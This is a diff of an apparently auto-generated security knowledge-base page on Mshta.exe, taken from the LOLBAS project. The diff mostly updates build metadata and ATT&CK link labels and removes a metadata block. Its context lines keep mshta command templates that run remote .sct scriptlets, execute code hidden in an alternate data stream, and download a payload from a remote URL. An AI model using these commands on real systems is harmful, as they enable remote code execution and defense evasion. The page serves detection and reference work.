@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/Mshta.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "Mshta.exe"
@@ -22,16 +22,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Mshta.exe
-
 Used by Windows to execute html applications. (.hta)
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2018-05-25
-- Author: Oddvar Moe
-- Source Path: yml/OSBinaries/Mshta.yml
 
 ## Paths
 
@@ -51,7 +42,7 @@ mshta.exe {PATH:.hta}
 - Use Case: Execute code
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.005]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218005-mshta|T1218.005: Mshta]]
 
 ### 2. Execute
 
@@ -64,7 +55,7 @@ mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
 - Use Case: Execute code
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.005]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218005-mshta|T1218.005: Mshta]]
 
 ### 3. Execute
 
@@ -77,7 +68,7 @@ mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
 - Use Case: Execute code
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.005]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218005-mshta|T1218.005: Mshta]]
 
 ### 4. ADS
 
@@ -90,7 +81,7 @@ mshta.exe "{PATH_ABSOLUTE}:file.hta"
 - Use Case: Execute code hidden in alternate data stream
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.005]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218005-mshta|T1218.005: Mshta]]
 
 ### 5. Download
 
@@ -103,7 +94,7 @@ mshta.exe {REMOTEURL}
 - Use Case: Downloads payload from remote server
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ## Detections
 
